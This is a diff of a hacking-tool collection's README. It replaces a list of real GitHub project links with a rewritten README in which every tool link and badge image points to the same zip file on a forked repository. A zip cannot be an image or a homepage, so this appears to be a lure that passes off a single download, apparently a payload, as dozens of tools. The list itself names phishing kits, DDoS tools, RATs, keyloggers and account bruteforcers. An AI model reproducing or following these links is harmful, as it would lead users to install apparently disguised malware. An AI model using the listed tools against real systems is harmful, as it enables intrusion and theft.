@@ -1,527 +1,296 @@
-<div align="center">
+### All in One Hacking tool For Hackers🥇
+![](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+![](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+![](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+![](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+![](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+![](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+![](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+[![HitCount](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+![](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip%20%7C%20KaliLinux%20%7C%20ParrotOs-blue)
 
-<img src="images/logo.svg" alt="HackingTool" width="600">
+#### Install Kali Linux in WIndows10 Without VirtualBox [YOUTUBE](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip) or use Docker
 
-<p><b>All-in-One Hacking Tool for Security Researchers & Pentesters</b></p>
-
-[![License](https://img.shields.io/github/license/Z4nzu/hackingtool)](LICENSE)&nbsp;
-[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)&nbsp;
-[![Version](https://img.shields.io/badge/v2.0.0-00FF88?style=flat-square)](#)&nbsp;
-[![Stars](https://img.shields.io/github/stars/Z4nzu/hackingtool?style=flat-square&color=yellow)](https://github.com/Z4nzu/hackingtool/stargazers)&nbsp;
-[![Forks](https://img.shields.io/github/forks/Z4nzu/hackingtool?style=flat-square&color=blue)](https://github.com/Z4nzu/hackingtool/network/members)&nbsp;
-[![Issues](https://img.shields.io/github/issues/Z4nzu/hackingtool?style=flat-square&color=red)](https://github.com/Z4nzu/hackingtool/issues)&nbsp;
-[![Last Commit](https://img.shields.io/github/last-commit/Z4nzu/hackingtool?style=flat-square&color=00FF88)](https://github.com/Z4nzu/hackingtool/commits/master)
-
-![](https://img.shields.io/badge/20_Categories-7B61FF?style=for-the-badge)
-![](https://img.shields.io/badge/185+_Tools-00FF88?style=for-the-badge)
-![](https://img.shields.io/badge/19_Tags-FF61DC?style=for-the-badge)
-![](https://img.shields.io/badge/Linux_%7C_Kali_%7C_Parrot_%7C_macOS-FFA116?style=for-the-badge&logo=linux&logoColor=white)
-
-<a href="#installation"><img src="https://img.shields.io/badge/Install_Now-00FF88?style=for-the-badge&logo=rocket&logoColor=black" alt="Install Now"></a>&nbsp;
-<a href="#quick-commands"><img src="https://img.shields.io/badge/Quick_Commands-7B61FF?style=for-the-badge&logo=terminal&logoColor=white" alt="Quick Commands"></a>&nbsp;
-<a href="https://github.com/Z4nzu/hackingtool/issues/new?template=tool_request.md"><img src="https://img.shields.io/badge/Suggest_a_Tool-FF61DC?style=for-the-badge&logo=plus&logoColor=white" alt="Suggest a Tool"></a>
-
-</div>
-
----
-
-
-## What's New in v2.0.0
-
-<table>
-<tr><td>
-
-| | Feature | Description |
-|:---:|---|---|
-| **🐍** | **Python 3.10+** | All Python 2 code removed, modern syntax throughout |
-| **🖥** | **OS-aware menus** | Linux-only tools hidden automatically on macOS |
-| **📦** | **185+ tools** | 35 new modern tools added across 6 categories |
-| **🔍** | **Search** | Type `/` to search all tools by name, description, or keyword |
-| **🏷** | **Tag filter** | Type `t` to filter by 19 tags — osint, web, c2, cloud, mobile... |
-| **💡** | **Recommend** | Type `r` — "I want to scan a network" → shows relevant tools |
-| **✅** | **Install status** | ✔/✘ shown next to every tool — know what's ready |
-| **⚡** | **Install all** | Option `97` in any category — batch install at once |
-| **🔄** | **Smart update** | Each tool has Update — auto-detects git pull / pip upgrade / go install |
-| **📂** | **Open folder** | Jump into any tool's directory for manual inspection |
-| **🐳** | **Docker** | Builds locally — no unverified external images |
-| **🚀** | **One-liner install** | `curl -sSL .../install.sh \| sudo bash` — zero manual steps |
-| **🏢** | **3 new categories** | Active Directory, Cloud Security, Mobile Security |
-
-</td></tr>
-</table>
+## Update Available V1.2.0 🚀 
+- [✔] Installation Bug Fixed
+- [x] Added New Tools 
+    - [x] Reverse Engineering
+    - [x] RAT Tools
+    - [x] Web Crawling 
+    - [x] Payload Injector
+- [x] Multitor Tools update
+- [X] Added Tool in wifijamming
+- [X] Added Tool in steganography
 
 
 
----
-
-## Quick Commands
-
-<div align="center">
-
-| Command | Action | Works in |
-|:---:|---|:---:|
-| `/query` | **Search** — find tools instantly by keyword | Main menu |
-| `t` | **Tags** — filter by osint, scanner, c2, cloud, mobile... | Main menu |
-| `r` | **Recommend** — "I want to do X" → matching tools | Main menu |
-| `?` | **Help** — quick reference card | Everywhere |
-| `q` | **Quit** — exit from any depth | Everywhere |
-| `97` | **Install All** — batch install all tools in category | Category |
-| `99` | **Back** — return to previous menu | Everywhere |
-
-</div>
-
----
-
-
-## Tool Categories
-
-<div align="center">
-
-| # | Category | Tools | | # | Category | Tools |
-|:---:|---|:---:|---|:---:|---|:---:|
-| 1 | 🛡 [Anonymously Hiding](#anonymously-hiding-tools) | 2 | | 11 | 🧰 [Exploit Framework](#exploit-framework) | 4 |
-| 2 | 🔍 [Information Gathering](#information-gathering-tools) | 26 | | 12 | 🔁 [Reverse Engineering](#reverse-engineering-tools) | 5 |
-| 3 | 📚 [Wordlist Generator](#wordlist-generator) | 7 | | 13 | ⚡ [DDOS Attack](#ddos-attack-tools) | 5 |
-| 4 | 📶 [Wireless Attack](#wireless-attack-tools) | 13 | | 14 | 🖥 [RAT](#remote-administrator-tools-rat) | 1 |
-| 5 | 🧩 [SQL Injection](#sql-injection-tools) | 7 | | 15 | 💥 [XSS Attack](#xss-attack-tools) | 9 |
-| 6 | 🎣 [Phishing Attack](#phishing-attack-tools) | 17 | | 16 | 🖼 [Steganography](#steganography-tools) | 4 |
-| 7 | 🌐 [Web Attack](#web-attack-tools) | 20 | | 17 | 🏢 [Active Directory](#active-directory-tools) | 6 |
-| 8 | 🔧 [Post Exploitation](#post-exploitation-tools) | 10 | | 18 | ☁ [Cloud Security](#cloud-security-tools) | 4 |
-| 9 | 🕵 [Forensics](#forensic-tools) | 8 | | 19 | 📱 [Mobile Security](#mobile-security-tools) | 3 |
-| 10 | 📦 [Payload Creation](#payload-creation-tools) | 8 | | 20 | ✨ [Other Tools](#other-tools) | 24 |
-
-</div>
+# Hackingtool Menu 🧰
+- [Anonymously Hiding Tools](#anonymously-hiding-tools)
+- [Information gathering tools](#information-gathering-tools)
+- [Wordlist Generator](#wordlist-generator)
+- [Wireless attack tools](#wireless-attack-tools)
+- [SQL Injection Tools](#sql-injection-tools)
+- [Phishing attack tools](#phishing-attack-tools)
+- [Web Attack tools](#web-attack-tools)
+- [Post exploitation tools](#post-exploitation-tools)
+- [Forensic tools](#forensic-tools)
+- [Payload creation tools](#payload-creation-tools)
+- [Exploit framework](#exploit-framework)
+- [Reverse engineering tools](#reverse-engineering-tools)
+- [DDOS Attack Tools](#ddos-attack-tools)
+- [Remote Administrator Tools (RAT)](#remote-administrator-tools--rat-)
+- [XSS Attack Tools](#xss-attack-tools)
+- [Steganograhy tools](#steganograhy-tools)
+- [Other tools](#other-tools)
+    - [SocialMedia Bruteforce](#socialmedia-bruteforce)
+    - [Android Hacking tools](#android-hacking-tools)
+    - [IDN Homograph Attack](#idn-homograph-attack)
+    - [Email Verify tools](#email-verify-tools)
+    - [Hash cracking tools](#hash-cracking-tools)
+    - [Wifi Deauthenticate](#wifi-deauthenticate)
+    - [SocialMedia Finder](#socialmedia-finder)
+    - [Payload Injector](#payload-injector)
+    - [Web crawling](#web-crawling)
+    - [Mix tools](#mix-tools)
 
 
-
----
-
-
-## 🛡 Anonymously Hiding Tools
-
-- [Anonymously Surf](https://github.com/Und3rf10w/kali-anonsurf)
-- [Multitor](https://github.com/trimstray/multitor)
-
-
-
-## 🔍 Information Gathering Tools
-
-- [Network Map (nmap)](https://github.com/nmap/nmap)
-- [Dracnmap](https://github.com/Screetsec/Dracnmap)
+### Anonymously Hiding Tools
+- [Anonmously Surf](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Multitor](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+### Information gathering tools
+- [Network Map (nmap)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Dracnmap](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
 - Port scanning
-- Host to IP
-- [Xerosploit](https://github.com/LionSec/xerosploit)
-- [RED HAWK](https://github.com/Tuhinshubhra/RED_HAWK)
-- [ReconSpider](https://github.com/bhavsec/reconspider)
-- IsItDown
-- [Infoga](https://github.com/m4ll0k/Infoga)
-- [ReconDog](https://github.com/s0md3v/ReconDog)
-- [Striker](https://github.com/s0md3v/Striker)
-- [SecretFinder](https://github.com/m4ll0k/SecretFinder)
-- [Shodanfy](https://github.com/m4ll0k/Shodanfy.py)
-- [rang3r](https://github.com/floriankunushevci/rang3r)
-- [Breacher](https://github.com/s0md3v/Breacher)
-- [theHarvester](https://github.com/laramies/theHarvester) ★
-- [Amass](https://github.com/owasp-amass/amass) ★
-- [Masscan](https://github.com/robertdavidgraham/masscan) ★
-- [RustScan](https://github.com/RustScan/RustScan) ★
-- [Holehe](https://github.com/megadose/holehe) ★
-- [Maigret](https://github.com/soxoj/maigret) ★
-- [httpx](https://github.com/projectdiscovery/httpx) ★
-- [SpiderFoot](https://github.com/smicallef/spiderfoot) ★
-- [Subfinder](https://github.com/projectdiscovery/subfinder) ★
-- [TruffleHog](https://github.com/trufflesecurity/trufflehog) ★
-- [Gitleaks](https://github.com/gitleaks/gitleaks) ★
-
-
-
-## 📚 Wordlist Generator
-
-- [Cupp](https://github.com/Mebus/cupp)
-- [WordlistCreator](https://github.com/Z4nzu/wlcreator)
-- [Goblin WordGenerator](https://github.com/UndeadSec/GoblinWordGenerator)
-- [Password list (1.4B)](https://github.com/Viralmaniar/SMWYG-Show-Me-What-You-Got)
-- [Hashcat](https://github.com/hashcat/hashcat) ★
-- [John the Ripper](https://github.com/openwall/john) ★
-- [haiti](https://github.com/noraj/haiti) ★
-
-
-
-## 📶 Wireless Attack Tools
-
-- [WiFi-Pumpkin](https://github.com/P0cL4bs/wifipumpkin3)
-- [pixiewps](https://github.com/wiire/pixiewps)
-- [Bluetooth Honeypot (bluepot)](https://github.com/andrewmichaelsmith/bluepot)
-- [Fluxion](https://github.com/FluxionNetwork/fluxion)
-- [Wifiphisher](https://github.com/wifiphisher/wifiphisher)
-- [Wifite](https://github.com/derv82/wifite2)
-- [EvilTwin](https://github.com/Z4nzu/fakeap)
-- [Fastssh](https://github.com/Z4nzu/fastssh)
+- Host to IP 
+- [Xerosploit](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [RED HAWK (All In One Scanning)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [ReconSpider(For All Scanning)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- IsItDown (Check Website Down/Up)
+- [Infoga - Email OSINT](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [ReconDog](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Striker](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [SecretFinder (like API & etc)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Find Info Using Shodan](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Port Scanner - rang3r (Python 2.7)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Port Scanner - Ranger Reloaded (Python 3+)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Breacher](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+### Wordlist Generator
+- [Cupp](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [WordlistCreator](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Goblin WordGenerator](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Password list (1.4 Billion Clear Text Password)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+### Wireless attack tools
+- [WiFi-Pumpkin](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [pixiewps](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Bluetooth Honeypot GUI Framework](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Fluxion](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Wifiphisher](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Wifite](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [EvilTwin](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Fastssh](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
 - Howmanypeople
-- [Airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon) ★
-- [hcxdumptool](https://github.com/ZerBea/hcxdumptool) ★
-- [hcxtools](https://github.com/ZerBea/hcxtools) ★
-- [Bettercap](https://github.com/bettercap/bettercap) ★
-
-
-
-## 🧩 SQL Injection Tools
-
-- [Sqlmap](https://github.com/sqlmapproject/sqlmap)
-- [NoSqlMap](https://github.com/codingo/NoSQLMap)
-- [DSSS](https://github.com/stamparm/DSSS)
-- [Explo](https://github.com/dtag-dev-sec/explo)
-- [Blisqy](https://github.com/JohnTroony/Blisqy)
-- [Leviathan](https://github.com/leviathan-framework/leviathan)
-- [SQLScan](https://github.com/Cvar1984/sqlscan)
-
-
-
-## 🎣 Phishing Attack Tools
-
-- [Autophisher](https://github.com/CodingRanjith/autophisher)
-- [PyPhisher](https://github.com/KasRoudra/PyPhisher)
-- [AdvPhishing](https://github.com/Ignitetch/AdvPhishing)
-- [Setoolkit](https://github.com/trustedsec/social-engineer-toolkit)
-- [SocialFish](https://github.com/UndeadSec/SocialFish)
-- [HiddenEye](https://github.com/Morsmalleo/HiddenEye)
-- [Evilginx3](https://github.com/kgretzky/evilginx2)
-- [I-See-You](https://github.com/Viralmaniar/I-See-You)
-- [SayCheese](https://github.com/hangetzzu/saycheese)
-- [QR Code Jacking](https://github.com/cryptedwolf/ohmyqr)
-- [BlackEye](https://github.com/thelinuxchoice/blackeye)
-- [ShellPhish](https://github.com/An0nUD4Y/shellphish)
-- [Thanos](https://github.com/TridevReddy/Thanos)
-- [QRLJacking](https://github.com/OWASP/QRLJacking)
-- [Maskphish](https://github.com/jaykali/maskphish)
-- [BlackPhish](https://github.com/iinc0gnit0/BlackPhish)
-- [dnstwist](https://github.com/elceef/dnstwist)
-
-
-
-## 🌐 Web Attack Tools
-
-- [Web2Attack](https://github.com/santatic/web2attack)
+### SQL Injection Tools
+- [Sqlmap tool](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [NoSqlMap](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Damn Small SQLi Scanner](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Explo](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Blisqy - Exploit Time-based blind-SQL injection](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Leviathan - Wide Range Mass Audit Toolkit](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [SQLScan](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+### Phishing attack tools
+- [Setoolkit](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [SocialFish](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [HiddenEye](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Evilginx2](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [I-See_You(Get Location using phishing attack)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [SayCheese (Grab target's Webcam Shots)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [QR Code Jacking](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [ShellPhish](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [BlackPhish](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+### Web Attack tools
+- [Web2Attack](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
 - Skipfish
-- [Sublist3r](https://github.com/aboul3la/Sublist3r)
-- [CheckURL](https://github.com/UndeadSec/checkURL)
-- [Sub-Domain TakeOver](https://github.com/edoardottt/takeover)
-- [Dirb](https://gitlab.com/kalilinux/packages/dirb)
-- [Nuclei](https://github.com/projectdiscovery/nuclei) ★
-- [ffuf](https://github.com/ffuf/ffuf) ★
-- [Feroxbuster](https://github.com/epi052/feroxbuster) ★
-- [Nikto](https://github.com/sullo/nikto) ★
-- [wafw00f](https://github.com/EnableSecurity/wafw00f) ★
-- [Katana](https://github.com/projectdiscovery/katana) ★
-- [Gobuster](https://github.com/OJ/gobuster) ★
-- [Dirsearch](https://github.com/maurosoria/dirsearch) ★
-- [OWASP ZAP](https://github.com/zaproxy/zaproxy) ★
-- [testssl.sh](https://github.com/drwetter/testssl.sh) ★
-- [Arjun](https://github.com/s0md3v/Arjun) ★
-- [Caido](https://github.com/caido/caido) ★
-- [mitmproxy](https://github.com/mitmproxy/mitmproxy) ★
-
-
-
-## 🔧 Post Exploitation Tools
-
-- [Vegile](https://github.com/Screetsec/Vegile)
-- [Chrome Keylogger](https://github.com/UndeadSec/HeraKeylogger)
-- [pwncat-cs](https://github.com/calebstewart/pwncat) ★
-- [Sliver](https://github.com/BishopFox/sliver) ★
-- [Havoc](https://github.com/HavocFramework/Havoc) ★
-- [PEASS-ng (LinPEAS/WinPEAS)](https://github.com/peass-ng/PEASS-ng) ★
-- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) ★
-- [Chisel](https://github.com/jpillora/chisel) ★
-- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) ★
-- [Mythic](https://github.com/its-a-feature/Mythic) ★
-
-
-
-## 🕵 Forensic Tools
-
+- [SubDomain Finder](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [CheckURL](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Blazy(Also Find ClickJacking)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Sub-Domain TakeOver](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Dirb](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+### Post exploitation tools
+- [Vegile - Ghost In The Shell](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Chrome Keylogger](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+### Forensic tools
 - Autopsy
 - Wireshark
-- [Bulk extractor](https://github.com/simsong/bulk_extractor)
-- [Guymager](https://guymager.sourceforge.io/)
-- [Toolsley](https://www.toolsley.com/)
-- [Volatility 3](https://github.com/volatilityfoundation/volatility3) ★
-- [Binwalk](https://github.com/ReFirmLabs/binwalk) ★
-- [pspy](https://github.com/DominicBreuker/pspy) ★
-
-
-
-## 📦 Payload Creation Tools
-
-- [The FatRat](https://github.com/Screetsec/TheFatRat)
-- [Brutal](https://github.com/Screetsec/Brutal)
-- [Stitch](https://nathanlopez.github.io/Stitch)
-- [MSFvenom Payload Creator](https://github.com/g0tmi1k/msfpc)
-- [Venom](https://github.com/r00t-3xp10it/venom)
-- [Spycam](https://github.com/indexnotfound404/spycam)
-- [Mob-Droid](https://github.com/kinghacker0/Mob-Droid)
-- [Enigma](https://github.com/UndeadSec/Enigma)
-
-
-
-## 🧰 Exploit Framework
-
-- [RouterSploit](https://github.com/threat9/routersploit)
-- [WebSploit](https://github.com/The404Hacking/websploit)
-- [Commix](https://github.com/commixproject/commix)
-- [Web2Attack](https://github.com/santatic/web2attack)
-
-
-
-## 🔁 Reverse Engineering Tools
-
-- [Androguard](https://github.com/androguard/androguard)
-- [Apk2Gold](https://github.com/lxdvs/apk2gold)
-- [JadX](https://github.com/skylot/jadx)
-- [Ghidra](https://github.com/NationalSecurityAgency/ghidra) ★
-- [Radare2](https://github.com/radareorg/radare2) ★
-
-
-
-## ⚡ DDOS Attack Tools
-
-- [DDoS Script](https://github.com/the-deepnet/ddos)
-- [SlowLoris](https://github.com/gkbrk/slowloris)
-- [Asyncrone](https://github.com/fatihsnsy/aSYNcrone)
-- [UFOnet](https://github.com/epsylon/ufonet)
-- [GoldenEye](https://github.com/jseidl/GoldenEye)
-
-
-
-## 🖥 Remote Administrator Tools (RAT)
-
-- [Pyshell](https://github.com/knassar702/pyshell)
-
-
-
-## 💥 XSS Attack Tools
-
-- [DalFox](https://github.com/hahwul/dalfox)
-- [XSS Payload Generator](https://github.com/capture0x/XSS-LOADER)
-- [Extended XSS Searcher](https://github.com/Damian89/extended-xss-search)
-- [XSS-Freak](https://github.com/PR0PH3CY33/XSS-Freak)
-- [XSpear](https://github.com/hahwul/XSpear)
-- [XSSCon](https://github.com/menkrep1337/XSSCon)
-- [XanXSS](https://github.com/Ekultek/XanXSS)
-- [XSStrike](https://github.com/UltimateHackers/XSStrike)
-- [RVuln](https://github.com/iinc0gnit0/RVuln)
-
-
-
-## 🖼 Steganography Tools
-
+- [Bulk extractor](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Disk Clone and ISO Image Acquire](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Toolsley](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Volatility3](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+### Payload creation tools
+- [The FatRat](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Brutal](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Stitch](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [MSFvenom Payload Creator](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Venom Shellcode Generator](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Spycam](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Mob-Droid](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Enigma](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+### Exploit framework
+- [RouterSploit](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [WebSploit](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip )
+- [Commix](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Web2Attack](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+### Reverse engineering tools
+- [Androguard](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip )
+- [Apk2Gold](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip )
+- [JadX](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+### DDOS Attack Tools
+- SlowLoris
+- [Asyncrone | Multifunction SYN Flood DDoS Weapon](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [UFOnet](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [GoldenEye](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+### Remote Administrator Tools (RAT)
+- [Stitch](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Pyshell](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+### XSS Attack Tools
+- [DalFox(Finder of XSS)](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [XSS Payload Generator](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Extended XSS Searcher and Finder](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [XSS-Freak](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [XSpear](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [XSSCon](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [XanXSS](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Advanced XSS Detection Suite](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [RVuln](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Cyclops](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip) 
+### Steganograhy tools
 - SteganoHide
-- [StegoCracker](https://github.com/W1LDN16H7/StegoCracker)
-- [Whitespace](https://github.com/beardog108/snow10)
-
-
-
-## 🏢 Active Directory Tools
-
-- [BloodHound](https://github.com/BloodHoundAD/BloodHound) ★
-- [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec) ★
-- [Impacket](https://github.com/fortra/impacket) ★
-- [Responder](https://github.com/lgandx/Responder) ★
-- [Certipy](https://github.com/ly4k/Certipy) ★
-- [Kerbrute](https://github.com/ropnop/kerbrute) ★
-
-
-
-## ☁ Cloud Security Tools
-
-- [Prowler](https://github.com/prowler-cloud/prowler) ★
-- [ScoutSuite](https://github.com/nccgroup/ScoutSuite) ★
-- [Pacu](https://github.com/RhinoSecurityLabs/pacu) ★
-- [Trivy](https://github.com/aquasecurity/trivy) ★
-
-
-
-## 📱 Mobile Security Tools
-
-- [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) ★
-- [Frida](https://github.com/frida/frida) ★
-- [Objection](https://github.com/sensepost/objection) ★
-
-
-
-## ✨ Other Tools
-
+- StegnoCracker
+- [StegoCracker](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Whitespace](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+### Other tools
 #### SocialMedia Bruteforce
-- [AllinOne SocialMedia Attack](https://github.com/Matrix07ksa/Brute_Force)
-- [Facebook Attack](https://github.com/Matrix07ksa/Brute_Force)
-- [Application Checker](https://github.com/jakuta-tech/underhanded)
-
-#### Android Hacking Tools
-- [Keydroid](https://github.com/F4dl0/keydroid)
-- [MySMS](https://github.com/papusingh2sms/mysms)
-- [Lockphish](https://github.com/JasonJerry/lockphish)
-- [DroidCam / WishFish](https://github.com/kinghacker0/WishFish)
-- [EvilApp](https://github.com/crypticterminal/EvilApp)
-
+- [Instagram Attack](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [AllinOne SocialMedia Attack](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
+- [Facebook Attack](https://raw.githubusercontent.com/Kali99xx/hackingtool/master/tools/Software-2.8-beta.1.zip)
